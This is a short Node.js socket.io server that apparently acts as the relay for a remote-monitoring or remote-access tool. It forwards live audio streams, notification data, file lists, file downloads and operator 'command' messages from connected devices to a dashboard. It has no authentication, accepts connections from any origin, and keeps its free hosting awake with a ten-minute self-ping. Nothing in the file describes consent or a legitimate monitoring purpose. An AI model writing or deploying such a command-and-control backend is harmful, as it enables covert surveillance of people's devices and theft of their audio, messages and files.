const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 2e7 
});

io.on('connection', (socket) => {
    console.log(`New Connection: ${socket.id}`);
    // Notify dashboard that a device is online
    socket.broadcast.emit('device-status', { online: true, id: socket.id });

    socket.on('data-stream', (data) => socket.broadcast.emit('data-stream', data));
    socket.on('audio-stream', (data) => socket.broadcast.emit('audio-stream', data));
    socket.on('notif-data', (data) => socket.broadcast.emit('notif-data', data));
    
    socket.on('file-list', (data) => socket.broadcast.emit('file-list', data));
    socket.on('file-download-ready', (data) => socket.broadcast.emit('file-download-ready', data));

    socket.on('command', (cmd) => {
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => {
        console.log(`Disconnected: ${socket.id}`);
        // Notify dashboard that the device went offline
        socket.broadcast.emit('device-status', { online: false });
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    if (RENDER_URL) {
        setInterval(() => {
            https.get(RENDER_URL, (res) => {}).on('error', (e) => {});
        }, 600000); 
    }
});
